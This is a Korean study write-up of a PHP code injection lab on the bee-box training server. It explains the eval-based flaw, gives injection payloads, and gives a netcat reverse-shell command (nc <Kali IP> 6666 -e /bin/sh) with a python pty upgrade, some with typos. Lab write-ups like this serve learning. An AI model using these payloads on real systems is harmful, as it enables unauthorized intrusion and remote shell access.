## PHP Code Injection

![chrome_UxFxP15OFQ](https://user-images.githubusercontent.com/79683414/134443409-9a005f07-5992-4a47-8042-1e594ae81687.png)

![chrome_nl8frdT2JG](https://user-images.githubusercontent.com/79683414/134443702-d254f75f-b673-464b-a420-28c577caf0ce.png)

OS Command Injection 과 같이, PHP 코드를 인젝션 하는 문제이다.

__message__ 를 클릭히니 "test"라는 문자열이 출력된다.

URL을 보니 GET 방식인 것을 알 수 있다.

message 변수에 test 대신 다른 문자열을 입력해서 공격하는 문제인듯 하다.

<br/>

<br/>

<br/>

### low

처음에 <script> 태그를 삽입해 보았는데 아무 반응이 없었다.

다음으로 문제 이름에 맞게 php 코드를 삽입해 보았다.

php injection 이 가능한지 테스트 해보기 위해  `';'`를 이용했다.

<br/>

<br/>

<br/>

![chrome_DBCgDN6MhD](https://user-images.githubusercontent.com/79683414/134445637-2231bcd6-b69d-4cd5-a6ff-01daf8edfa0d.png)

pay : _msg;system("whoami)_

php 코드가 성공적으로 삽입되었다.

이전 문제들에서는 불가능 했던 php 코드 인젝션이 가능한 이유를 찾기 위해 코드를 살펴보았다.

<br/>

<br/>

<br/>

![Code_ZU4xvxhvCv](https://user-images.githubusercontent.com/79683414/134446502-f465b87d-0063-4990-b0cd-3c6fd61e0770.png)

__@eval__ 함수는 매개변수(String) 을 PHP 코드로 취급하겠다는 함수이다.

따라서 위에서 조작한 message 의 내용이 그대로 PHP 코드가 되는 것...

"이걸로 쉘 획득하세요" 라고 말해주는 것 같았다.

> PHP-eval() : https://www.php.net/manual/en/function.eval.php

<br/>

<br/>

<br/>

OS Command Injection 에서 했던 것 처럼,

칼리에서 포트를 리스닝으로 열어 놓고 bee-box에서 nc 명령을 입력했다.

- Kali : `nc -lvp 6666`

- bee : `msf;system("nc <Kali IP> 6666 -e /bin/sh")`

![chrome_8TOzxhRz8z](https://user-images.githubusercontent.com/79683414/134449912-7156715f-00a0-43f6-a824-d522470e6905.png)
![vmware_7POsRRx4rB](https://user-images.githubusercontent.com/79683414/134449957-57377247-7e7a-4e81-9e92-27351c19dd40.png)

<br/>

<br/>

<br/>

성공적으로 리버스 쉘을 획득했다.

원격으로 쉘을 획득했을 때 프롬프트가 보이지 않아서 불편하기도 하고,

vi 도 사용할 수 없다.(가능은 하지만 정상적인 출력을 하지 않아서 불편;;)

여기서 사용하는 재밌는 개념이 pseudo-terminal 이다.

<br/>

`python -c 'import pty;pty.spwan("/bin/bash")'`

![vmware_YqFUZVk0yH](https://user-images.githubusercontent.com/79683414/134450518-a092c9c9-ce0b-4a36-a64f-87e6ebc2f32f.png)

<br/>

<br/>

<br/>

~~tty, pty 는 처음 접하는 개념이라 정확하지 않지만...~~

'Teletypewrite', 일반적으로 터미널이라 부르는 것들이다.

리눅스에서 사용하는 터미널의 종류는 tty, ttys, pts, pty으로 `/dev` 에 속해있다.

자신의 터미널을 확인하려면 `tty` 를 이용하면 된다.

- tty : 일반 CLI 콘솔
- ttys : 시리얼 tty
- pts : 기본 xwindows를 위한 가상 콘솔(xwindow 는 GUI 환경을 뜻함)

> __Pseudo-Terminals__
>
> https://www.gnu.org/software/libc/manual/html_node/Pseudo_002dTerminals.html

<br/>

<br/>

<br/>

위의 명령어의 정확한 동작방식은 아직 이해되진 않지만,

pty를 새로 생성해서 python이 프롬프트를 띄워주는? 방식으로 예상 중 이다....

